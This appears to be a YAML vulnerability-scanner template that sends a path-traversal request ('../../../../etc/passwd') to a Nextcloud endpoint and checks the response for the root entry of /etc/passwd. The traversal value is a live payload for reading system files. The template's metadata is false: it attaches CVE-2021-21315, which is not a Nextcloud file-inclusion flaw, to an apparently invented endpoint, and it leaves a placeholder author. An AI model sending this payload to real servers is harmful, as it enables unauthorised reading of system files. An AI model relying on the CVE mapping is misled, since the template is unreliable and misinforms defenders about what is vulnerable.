id: CVE-2021-21315

info:
  name: Nextcloud Server LFI
  author: YourName
  severity: high
  description: This template detects CVE-2021-21315 LFI vulnerability in Nextcloud Server.
  references:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21315
  tags: cve, lfi, nextcloud

requests:
  - raw:
      - |
        GET /index.php/apps/files_external/globalstorages/1?testConfig=../../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
        Connection: close

    matchers:
      - type: word
        words:
          - "root:x:0:0:"
        part: body
